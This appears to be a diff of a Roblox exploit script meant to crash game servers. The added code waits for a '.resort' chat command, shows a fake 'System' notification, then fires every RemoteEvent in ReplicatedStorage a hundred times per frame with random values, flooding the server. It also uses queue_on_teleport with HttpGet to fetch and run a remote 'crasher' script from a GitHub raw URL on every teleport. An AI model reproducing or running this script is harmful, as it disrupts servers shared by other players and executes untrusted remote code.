@@ -1,9 +1,37 @@
-for _, remote in next, game:GetService("ReplicatedStorage"):GetDescendants() do  
-    if remote:IsA("RemoteEvent") then  
-        game:GetService("RunService") .Heartbeat:Connect(function()  
-            for i = 1, 100 do 
-                remote:FireServer(math.random(), math.random(), math.random())
-            end  
-        end)  
-    end  
-end  
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+
+local LocalPlayer = Players.LocalPlayer
+local active = false
+if queue_on_teleport then
+    queue_on_teleport(game:HttpGet("https://raw.githubusercontent.com/codexvsberserkerxylo/scripts/refs/heads/main/crasher"))
+end
+LocalPlayer.Chatted:Connect(function(msg)
+    if msg:lower() == ".resort" and not active then
+        active = true
+        pcall(function()
+            StarterGui:SetCore("SendNotification", {
+                Title = "System";
+                Text = "Resort Loaded";
+                Duration = 3;
+            })
+        end)
+        for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
+            if remote:IsA("RemoteEvent") then
+                RunService.Heartbeat:Connect(function()
+                    for i = 1, 100 do
+                        remote:FireServer(math.random(), math.random(), math.random())
+                    end
+                end)
+            end
+        end
+    elseif msg:lower() == ".resort" and active then
+        StarterGui:SetCore("SendNotification", {
+            Title = "System";
+            Text = "Already Running";
+            Duration = 2;
+        })
+    end
+end)
